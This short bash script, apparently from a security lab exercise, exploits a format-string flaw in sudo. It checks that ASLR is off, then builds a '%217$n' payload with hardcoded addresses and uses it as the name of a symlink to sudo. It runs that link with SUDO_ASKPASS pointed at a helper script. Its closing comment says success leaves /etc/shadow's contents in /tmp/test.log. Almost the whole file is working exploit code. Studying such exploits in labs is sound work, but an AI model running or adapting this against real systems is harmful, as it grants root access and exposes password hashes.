#!/bin/bash
# must be executed under current directory
aslrflag=$(cat /proc/sys/kernel/randomize_va_space)
echo "--- ASLR flag: "$aslrflag
if [ ! $aslrflag = "0" ]; then
    echo "--- sudo_exploit1.sh expects ASLR disabled. Stop."
    exit 1
fi

cp -f ./test.sh /tmp/test.sh
YOUR_SOLUTION=$(echo -ne "%217\$nAA\xfe\xc7\x05\x08BBBBBBBBBBCCCCCCCCCCDDDDDDDDDDEEEEEEEEEEFFFFFFFFFFGGGGGGGGGGHHHHHHHHHHIIIIIIIIIIJJJJJJJJJJKKKKKKKKKKLLLLLLLLLLMMMMMMMMMMNNNNNNNNNNOOOOOOOOOO\x0b\xdf\xff\xffPPPPPPQQQQQQQQQQRRRRRRRRRRSSSSSSSSSSTTTTTTTT")


ln -s /usr/local/libexec/sudo $YOUR_SOLUTION
env -i SUDO_ASKPASS=/tmp/test.sh ./$YOUR_SOLUTION -D9 -A ls

rm $YOUR_SOLUTION
# rm -f /tmp/test.sh
# rm -f /tmp/test.log
echo "--- check /tmp/test.log to see if it contains content of /etc/shadow"

